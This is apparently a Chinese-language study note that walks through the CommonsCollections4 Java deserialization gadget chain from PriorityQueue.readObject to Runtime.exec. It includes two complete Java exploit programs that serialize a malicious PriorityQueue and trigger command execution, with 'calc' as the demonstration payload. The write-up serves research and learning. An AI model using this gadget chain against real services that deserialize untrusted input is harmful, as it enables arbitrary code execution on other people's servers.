---
title: CommonsCollections4
date: 2021-12-22 18:39:20
categories:
- Java
tags:
- Deserialization exploit chain
toc: true
notshow: true
---

# 流程图

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640140973435-c977de58-fb2e-4f5b-9e09-7c10d91707f6.jpeg)



# 分析与复现



## 0x00 概述

CC4 是 commons-collections4 包中的一条链，与此前 commons-collections3 中的链相同之处在于触发点是一致的，调用 invokeTransformer 进行命令执行或者调用 instantiateTransformer 触发 TrAXFilter 进行任意代码执行。不同点在于，CC4 使用了不同的入口点—— PriorityQueue。

### 利用版本



CommonsCollections 4.0



### 限制



JDK版本：暂无限制

## 0x01 触发点

CC4 的触发点与CC1、CC3 一致，invokeTransformer 或者 ClassLoader。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640140176421-25b6169b-bccd-428e-83d4-beffd4362a61.png)

## 0x02 利用链

不同于CC1、CC3 使用的 invokeTransformer 和 instantiateTransformer ，CC4 使用了另一个 TransformingComparator。可以看到 TransformingComparator 实现了 Serializable。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640140375721-4b9cd174-c882-4e01-b598-5c62a295dc0f.png)

并且 TransformingComparator.compare 方法调用了 transform 方法。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640140361824-34354536-64c2-44b4-8f18-91566cdb7bb0.png)

this.transformer 是在构造函数中赋值的。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640140416982-6bb84568-9939-483d-97bc-224c5612535c.png)

compare 这个方法很通用，因此可以在很多地方找到同名函数，CC4 在 PriorityQueue 优先队列中找到了 compare 方法的调用。

PriorityQueue.siftDownUsingComparator 对 compare 进行了调用。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640140524907-564d94ef-a2c9-41b8-a00b-cc6613b03bf5.png)

继续往上寻找到 siftDown 方法，仍旧是一个 private 方法。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640140613765-ccd848a3-8c05-4ff7-b63e-e40879f3982b.png)

再次 find Usage，在 heapify 中找到调用。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640140666663-3d2576d1-bf60-4754-8974-adadc1147389.png)

heapify 在 PriorityQueue.readObject 中调用。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640140717119-6ce06a08-b5f3-452d-91f3-1466b43b42f2.png)

至此，这一条利用链已经完备了，流程图如下：

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640140994164-a55942ff-0cb8-43f6-9302-e81104ebff53.png)

下面编写 exp：

将 PriorityQueue 的 comparator 赋值为 transformingComparator，transformingComparator 中的 transformer 赋值为 chainedTransformer。另外，在 Commons-collections4 中，ChainedTransformer 接收变长数组。因此可以不用提前声明 Transformer 数组了。

```java
public class CC4 {
    public static void main(String[] args) throws Exception{
        TestTransformingComparator();
        unserialize("abc.ser.bin");
    }
	public static void TestTransformingComparator() throws Exception{
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new ConstantTransformer(
                        Runtime.class
                ),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                ));
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer, null);
        PriorityQueue priorityQueue = new PriorityQueue();

        Field comparatorField = PriorityQueue.class.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue,transformingComparator);
        serialize(priorityQueue);
    }

    public static void serialize(Object o) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("abc.ser.bin"));
        oos.writeObject(o);
    }

    public static void unserialize(String filePath) throws Exception{
        ObjectInputStream ins = new ObjectInputStream(new FileInputStream(filePath));
        ins.readObject();
    }
}
```

执行后什么也没有发生，调试进去看一下。heapify 中遍历时先将 i 右移一位，然后判断是否大于等于零。当前 size = 0 ，所以不能进入 siftDown。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640155874724-e24a2a15-c119-44ac-968f-b938de90d14c.png)

也就是说我们在序列化前，还需要往优先队列中插入至少两个值。

```java
        priorityQueue.add("1");
        priorityQueue.add("2");
```

再次调试，先不执行反序列化，发现也能够弹出计算器。发现 add 函数中调用 offer 函数。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640156091245-c6332b2a-8ec5-46b7-bf45-0c5128458348.png)

由于 size > 0 ，offer 函数中也会调用 siftUp。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640156109915-4e536178-f7f2-4d83-9284-984e3fd6fa03.png)

siftUp 函数中，如果存在 comparator ，就调用 siftUpUsingComparator，也就会走完利用链。

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640156145634-435b00d8-d730-4fea-a4d4-11329add813b.png)

我们在序列化的时候当然不需要执行利用链，因此可以在 add 前将 comparator 置为 null，再在序列化前将 comparator 置为 transformingComparator。

最终 exp:

```java
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CC4 {
    public static void main(String[] args) throws Exception{
        TestTransformingComparator();
        unserialize("abc.ser.bin");
    }

    public static void TestTransformingComparator() throws Exception{
        ChainedTransformer chainedTransformer = new ChainedTransformer(
                new ConstantTransformer(
                        Runtime.class
                ),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class,Class[].class},
                        new Object[]{"getRuntime",null}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class,Object[].class},
                        new Object[]{null,null}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc"}
                ));
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer, null);
        PriorityQueue priorityQueue = new PriorityQueue();

        Field comparatorField = PriorityQueue.class.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(priorityQueue,null);
        priorityQueue.add("1");
        priorityQueue.add("2");

        comparatorField.set(priorityQueue,transformingComparator);
        serialize(priorityQueue);

    }

    public static void serialize(Object o) throws Exception{
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("abc.ser.bin"));
        oos.writeObject(o);
    }

    public static void unserialize(String filePath) throws Exception{
        ObjectInputStream ins = new ObjectInputStream(new FileInputStream(filePath));
        ins.readObject();
    }
}
```

成功弹出计算器：

![img](http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/1640156317434-4cee788e-5b80-4e05-90ab-5deb7417c220.png)

# 参考文章

- [Java反序列化CommonsCollections篇(四)-摆烂的完结篇](https://www.bilibili.com/video/BV1NQ4y1q7EU?spm_id_from=333.999.0.0)
- [ysoserial](https://github.com/frohoff/ysoserial)

- [Commons-Collections 1-7 利用链分析](http://wjlshare.com/archives/1535)